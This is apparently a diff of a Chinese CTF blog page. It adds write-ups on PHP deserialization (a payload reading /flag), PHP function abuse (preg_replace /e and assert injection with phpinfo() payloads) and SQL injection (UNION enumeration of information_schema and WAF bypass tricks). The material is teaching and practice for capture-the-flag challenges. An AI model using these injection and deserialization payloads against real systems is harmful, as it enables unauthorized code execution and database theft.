@@ -432,7 +432,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/06/CTF/php%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/06/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -446,7 +446,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/03/06/CTF/php%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">CTF 关于php的函数利用</a>
+            <a href="/2026/03/06/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">CTF反序列化</a>
         </h2>
 
         <div class="post-meta">
@@ -459,7 +459,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2026-03-06 00:00:00 / 修改时间：17:42:10" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
+              <time title="创建时间：2026-03-06 00:00:00 / 修改时间：17:38:36" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -482,25 +482,27 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><hr>
-<pre><code>preg_replace \e 模式（PHP 5.5 开始废弃，PHP 7 直接移除）
-</code></pre>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>( pattern, string2 replacement, string3 tg, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;count&#x27;</span>);</span><br><span class="line"><span class="comment">// 将tg中的pattern均替换成replacement</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>( <span class="string">&quot;/World/&quot;</span>, <span class="string">&quot;PHP&quot;</span>, <span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"><span class="comment">//输出 “Hello PHP!”</span></span><br></pre></td></tr></table></figure>
+          <h2 id="反序列化Unser"><a href="#反序列化Unser" class="headerlink" title="反序列化Unser"></a>反序列化Unser</h2><p>php中的两个函数<code>serialize  unserialize</code></p>
+<p>反序列化对象如果为已经存在的类则会调用魔术方法</p>
+<ol>
+<li><code>__construct</code> : 构造函数，在对应对象实例化时被自动调用</li>
+<li><code>__wakeup</code> : 在对象反序列化时调用</li>
+<li><code>__sleep</code> : 在对象序列化时被调用</li>
+</ol>
+<p>序列化时会先调用 <code>sleep</code> 再调用 <code>destruct</code>, 故而完整的调用顺序为: <br><code>sleep</code> -&gt; <code>(变量存在)</code> -&gt; <code>destruct</code></p>
+<p>反序列化时如果有 <code>__wakeup</code> 则会调用 <code>__wakeUp</code> 而不是 <code>__construct</code>, 故而逻辑为 <code>__wakeUp/__construct</code> -&gt; <code>(变量存在)</code></p>
+<p><em><strong>PHP一些函数</strong></em></p>
+<p><code>A instanceof B</code> 运算符: <strong>用于判断一个变量是否是某个类、其父类或实现某接口的实例</strong>，如果是，返回 <em>true</em>，否则返回 <em>false</em></p>
+<p><code>is_callable()</code> 用于<strong>检测一个变量的值在当前作用域中是否可以作为函数或方法调用</strong>，常用于回调验证</p>
+<p><code>call_user_func()</code> 是PHP中的一个功能强大的函数，它允许你调用一个回调函数，并传递给它一些参数。这个函数非常灵活，可以用来调用全局函数、类方法，甚至是闭包</p>
+<p><code>___invoke()</code> 是一种特殊的魔术方法，用于让对象像函数一样被调用。当你尝试以函数调用的方式执行一个对象时，PHP 会自动调用该对象的 __<em>invoke()</em> 方法。此特性自 <strong>PHP 5.3.0</strong> 起可用，并且必须声明为 <em>public</em></p>
+<p><code>file_get_contents()</code> 本地文件读取或者远程读取 如果为可执行文件则执行后返回结果<br>	此处有php:&#x2F;&#x2F;filter, data:&#x2F;&#x2F;, 伪协议实现base64加密后文件的读取</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="ezunser"><a href="#ezunser" class="headerlink" title="ezunser"></a>ezunser</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key </span>= <span class="string">&#x27;welcome&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$store</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __destruct</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="variable">$this</span>-&gt;store <span class="keyword">instanceof</span> Store) &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;key);  <span class="comment">//此处创建了Store实例</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Store</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handler</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function get</span>(<span class="variable">$key</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">is_callable</span>(<span class="variable">$this</span>-&gt;handler)) &#123;  </span><br><span class="line">            <span class="keyword">return</span><span class="title function_ invoke__"> call_user_func</span>(<span class="variable">$this</span>-&gt;handler, <span class="variable">$key</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileInvoker</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file </span>= <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __invoke</span>(<span class="variable">$key</span>) &#123;        <span class="variable">$path </span>= <span class="variable language_">$this</span>-&gt;file;  </span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="variable">$path</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SafeNote</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text </span>= <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __toString</span>() &#123;  </span><br><span class="line">        <span class="keyword">return</span><span class="title function_ invoke__"> </span>(<span class="keyword">string</span>) <span class="variable language_">$this</span>-&gt;text;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;    <span class="variable">$data </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];  </span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&lt;!-- POST data=serialized_string --&gt;\n&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>&#x2F;e 修正符（modifier）是 PHP 的一个特性，使得 preg_replace() 将替换参数 replacement 当作 PHP 代码执行。在匹配到的字符串进行替换时，会先解析替换字符串，然后执行其中的 PHP 代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/bad/e&#x27;</span>, <span class="string">&#x27;&quot;g&quot; . (1 - 1 ). (1 - 1) . &quot;d&quot;&#x27;</span>, <span class="string">&quot;he is a bad boy&quot;</span>);</span><br><span class="line"><span class="comment">//he is a g00d boy</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>攻防世界 ics-05</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line"><span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line"><span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>使用&#x2F;e 执行替换时执行<code>replacement</code> 表达式<br>构造 <code>pat = /test/e &amp; rep = phpinfo() &amp; sub = just test</code>  </p>
-<hr>
-<pre><code>bool assert(mixed $assertion,string $description])
-</code></pre>
-<p><code>$assertion</code> 要验证的表达式<br><code>$description</code> 可选 ， 断言失败时输出的自定义描述信息，便于定位问题</p>
-<p><strong>攻防世界 mfw</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>由于<code>assert</code> 会直接执行表达式且 <code>file</code> 变量可控 考虑提前闭合引号注入<br>构造 <code>?page=&#39;) or phpinfo()</code> </p>
+<p>构造序列化payload <a target="_blank" rel="noopener" href="https://onecompiler.com/">php online </a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">	  <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;anything&#x27;</span>;</span><br><span class="line">	  <span class="keyword">public</span> <span class="variable">$store</span>;</span><br><span class="line">	  </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Store</span></span>&#123;</span><br><span class="line">	  <span class="keyword">public</span> <span class="variable">$handlier</span>;</span><br><span class="line">	  </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">FileInvoker</span></span>&#123;</span><br><span class="line">	  <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$cache</span> = <span class="keyword">new</span> <span class="title class_">Cache</span>();</span><br><span class="line">	<span class="variable">$store</span> = <span class="keyword">new</span> <span class="title class_">Store</span>();</span><br><span class="line">	<span class="variable">$fileinvoker</span> = <span class="keyword">new</span> <span class="title class_">FileInvoker</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$store</span>-&gt;handlier = <span class="variable">$fileinvoker</span>;</span><br><span class="line">	<span class="variable">$cache</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$cache</span>);</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行得到：<code>O:5:&quot;Cache&quot;:2:{s:3:&quot;key&quot;;s:8:&quot;anything&quot;;s:5:&quot;store&quot;;O:5:&quot;Store&quot;:1:{s:8:&quot;handlier&quot;;O:11:&quot;FileInvoker&quot;:1:{s:4:&quot;file&quot;;s:5:&quot;/flag&quot;;}}}</code></p>
 
       
     </div>
@@ -602,6 +604,96 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/06/CTF/php%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Ducklinger">
+      <meta itemprop="description" content="分享日常">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ducklinger">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/03/06/CTF/php%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">CTF 关于php的函数利用</a>
+        </h2>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-03-06 00:00:00 / 修改时间：17:42:10" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><hr>
+<pre><code>preg_replace \e 模式（PHP 5.5 开始废弃，PHP 7 直接移除）
+</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>( pattern, string2 replacement, string3 tg, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;count&#x27;</span>);</span><br><span class="line"><span class="comment">// 将tg中的pattern均替换成replacement</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>( <span class="string">&quot;/World/&quot;</span>, <span class="string">&quot;PHP&quot;</span>, <span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"><span class="comment">//输出 “Hello PHP!”</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;e 修正符（modifier）是 PHP 的一个特性，使得 preg_replace() 将替换参数 replacement 当作 PHP 代码执行。在匹配到的字符串进行替换时，会先解析替换字符串，然后执行其中的 PHP 代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/bad/e&#x27;</span>, <span class="string">&#x27;&quot;g&quot; . (1 - 1 ). (1 - 1) . &quot;d&quot;&#x27;</span>, <span class="string">&quot;he is a bad boy&quot;</span>);</span><br><span class="line"><span class="comment">//he is a g00d boy</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻防世界 ics-05</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line"><span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line"><span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用&#x2F;e 执行替换时执行<code>replacement</code> 表达式<br>构造 <code>pat = /test/e &amp; rep = phpinfo() &amp; sub = just test</code>  </p>
+<hr>
+<pre><code>bool assert(mixed $assertion,string $description])
+</code></pre>
+<p><code>$assertion</code> 要验证的表达式<br><code>$description</code> 可选 ， 断言失败时输出的自定义描述信息，便于定位问题</p>
+<p><strong>攻防世界 mfw</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于<code>assert</code> 会直接执行表达式且 <code>file</code> 变量可控 考虑提前闭合引号注入<br>构造 <code>?page=&#39;) or phpinfo()</code> </p>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/06/CTF/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -627,10 +719,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2026-03-06 00:00:00 / 修改时间：17:39:42" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
+              <time title="创建时间：2026-03-06 00:00:00" itemprop="dateCreated datePublished" datetime="2026-03-06T00:00:00+08:00">2026-03-06</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-08 20:39:04" itemprop="dateModified" datetime="2026-03-08T20:39:04+08:00">2026-03-08</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -652,7 +750,45 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
+          <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>通过注入可以查到数据库所有内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--+ 的目的是注释后面代码，‘+’在url中表示空白符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--爆破列数</span></span><br><span class="line"><span class="comment">--ORDER BY 1 是按第一列排序，如果正常，说明至少有 1 列</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> N;</span><br><span class="line"><span class="comment">--或者使用union select 联合查询 将select查询到的结果一同返回</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4.</span>.. <span class="comment">--列数要与之前相同，同时可以找到页面回显的位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 假如列数为4且回显位置为2</span></span><br><span class="line"><span class="comment">--得到数据库名</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span>; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--MySQL 中有一个系统数据库叫 information_schema，里面记录了所有表的信息。我们用 group_concat() 把多个表名拼成一行</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--同理可以查询到表里面的列假设表名为 mytable</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;mytable&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--查询列信息 data</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(data),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> <span class="string">&#x27;mytable&#x27;</span> (limit <span class="number">0</span>,<span class="number">1</span>(逐条查看))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>后端通常有简单的过滤规则（WAF）。</p>
+<table>
+<thead>
+<tr>
+<th><strong>被过滤字符</strong></th>
+<th><strong>绕过方式</strong></th>
+<th><strong>原理</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>空格</strong></td>
+<td><code>/**/</code></td>
+<td>在 SQL 中，注释符可作为空白分隔符</td>
+</tr>
+<tr>
+<td><strong>空格</strong></td>
+<td><code>%0a</code>, <code>%a0</code></td>
+<td>使用换行符或不换行空格的编码</td>
+</tr>
+<tr>
+<td><strong>单引号</strong></td>
+<td><code>0x</code> (Hex)</td>
+<td>将字符串转为十六进制，如 <code>&#39;flag&#39;</code> → <code>0x666c6167</code></td>
+</tr>
+<tr>
+<td><strong>关键字</strong></td>
+<td>双写&#x2F;大小写</td>
+<td>如 <code>UNunionION</code> 或 <code>uNiOn</code> (视环境而定)</td>
+</tr>
+</tbody></table>
+<p><strong>盲注（无回显）借助脚本爆破</strong></p>
+<p><strong>攻防世界fakebook</strong><br>常规爆破得到字段数为 4 数据库名为<em><strong>fakebook</strong></em> 有一个表名为<em><strong>users</strong></em> 有四列分别为 <em><strong>no username passwd data</strong></em> 读取 <em><strong>data</strong></em> 得到序列化字符串 <em><strong>~O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:12;s:4:”blog”;s:14:”<a target="_blank" rel="noopener" href="http://test.com";}/">http://test.com&quot;;}</a>,</strong></em> </p>
